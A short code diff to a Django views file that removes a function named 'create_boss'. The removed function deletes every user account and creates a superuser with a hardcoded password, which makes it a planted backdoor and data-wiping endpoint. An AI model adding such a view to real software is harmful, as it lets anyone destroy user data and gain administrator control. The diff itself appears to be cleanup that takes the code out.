@@ -289,7 +289,3 @@ def PaymentFailed(request,productId):
 
 
 
-def create_boss(request):
-    User.objects.all().delete()
-    u = User.objects.create_superuser('boss', 'boss@test.com', 'Boss2024!')
-    return HttpResponse(f'Created: {u.username}, superuser: {u.is_superuser}')
